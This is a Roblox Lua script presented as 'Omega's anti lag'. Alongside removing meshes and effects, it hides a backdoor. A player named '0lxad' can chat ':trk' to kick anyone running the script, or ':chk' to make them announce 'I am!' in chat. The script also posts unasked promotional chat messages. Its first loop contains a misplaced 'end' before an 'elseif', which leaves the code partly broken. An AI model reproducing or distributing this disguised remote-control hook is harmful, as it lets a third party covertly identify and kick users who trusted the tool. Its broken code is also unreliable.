repeat wait() until game:IsLoaded()
local Players = game.Players
local Player = game.Players.LocalPlayer
local runservice = game:GetService('RunService')
local safe = CFrame.new(93486234289567190, 123490821468906714000, 134891670418940198908)
local ann = false
function unhinge(v)
coroutine.wrap(function()
if v.BackSurface == Enum.SurfaceType.Hinge then 
    v.BackSurface = Enum.SurfaceType.Smooth
elseif v.FrontSurface == Enum.SurfaceType.Hinge then
    v.FrontSurface = Enum.SurfaceType.Smooth
elseif v.BottomSurface == Enum.SurfaceType.Hinge then
    v.BottomSurface = Enum.SurfaceType.Smooth
elseif v.LeftSurface == Enum.SurfaceType.Hinge then
    v.LeftSurface = Enum.SurfaceType.Smooth
elseif v.RightSurface == Enum.SurfaceType.Hinge then 
    v.RightSurface = Enum.SurfaceType.Smooth
elseif v.TopSurface == Enum.SurfaceType.Hinge then
    v.TopSurface = Enum.SurfaceType.Smooth
end
end)()
end

say = function(Message)
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(Message,"all")
end

coroutine.wrap(function()
for i,descendant in game.Workspace:GetDescendants() do
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
            descendant.DisplayName = 'made by 0megaa.#0'
        end
        descendant:GetPropertyChangedSignal('DisplayName'):Connect(function()
            if #descendant.DisplayName>50 then
                descendant.DisplayName = 'Omega is daddy'
            end
        end)
	end
    elseif descendant.Name=='Mesh' or descendant.Name=='SpecialMesh' or descendant.ClassName=='ParticleEmitter' or descendant.ClassName=='Smoke' then
        if descendant.Parent.Name~='Head' and descendant.Parent.Name~='Handle' then
            if not descendant:IsDescendantOf(Workspace.SecureParts) then
                task.wait()
                descendant:Destroy()
            end
        end
    end
end
end)()

coroutine.wrap(function()
for i,Child in Players:GetChildren() do
	if Child.Name == '0lxad' then
		print("Daddy found!")
		local Daddy = Child
		Daddy.Chatted:Connect(function(msg)
    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
      			if Player.Name == '0lxad' then print("Skids kicked")
      			else
        		local kmsg = string.split(msg, ':trk')[1]
            	Player:Kick(kmsg)
      			end
    		end
		end)
        Daddy.Chatted:Connect(function(msg)
            if string.lower(msg) == ":chk" then
                say('I am!')
			end
        end)
	end
end
end)()
local function onDescendantAdded(descendant)
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
            descendant.DisplayName = 'made by afvk#0'
        end
        descendant:GetPropertyChangedSignal('DisplayName'):Connect(function()
            if #descendant.DisplayName>50 then
                descendant.DisplayName = 'Omega is daddy'
            end
        end)
    elseif descendant.Name=='Mesh' or descendant.Name=='SpecialMesh' or descendant.ClassName=='ParticleEmitter' or descendant.ClassName=='Smoke' then
        if descendant.Parent.Name~='Head' and descendant.Parent.Name~='Handle' then
            if not descendant:IsDescendantOf(Workspace.SecureParts) then
                task.wait()
                descendant:Destroy()
            end
        end
    elseif descendant.ClassName == 'SkateboardPlatform' then
        descendant.Name = 'NoBoard xd'
        descendant:GetPropertyChangedSignal('Position'):Connect(function()
            descendant.Position = safe
        end)
    elseif descendant.ClassName == 'Part' then
        task.wait()
        unhinge(descendant)
    end
end

rchat = function(Message)
  Players:Chat(Message)
end

Players.PlayerAdded:Connect(function(plr)
	if plr.Name == '0lxad' then
		print("Daddy found!")
		local Daddy = plr
		Daddy.Chatted:Connect(function(msg)
    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
      			if Player.Name == '0lxad' then print("Skids kicked")
      			else
        		local kmsg = string.split(msg, ':trk')[1]
            	Player:Kick(kmsg)
      			end
    		end
		end)
        Daddy.Chatted:Connect(function(msg)
            if string.lower(msg) == ":chk" then
                say('I am!')
			end
        end)
	end
end)
workspace.Camera:GetPropertyChangedSignal('FieldOfView'):Connect(function()
    if workspace.Camera.FieldOfView ~= 70 then
        workspace.Camera.FieldOfView = 70
    end
end)

workspace.DescendantAdded:Connect(onDescendantAdded)
game.Chat.BubbleChatEnabled = false

say('1ucd is better')
say("Loaded Omega's anti lag")
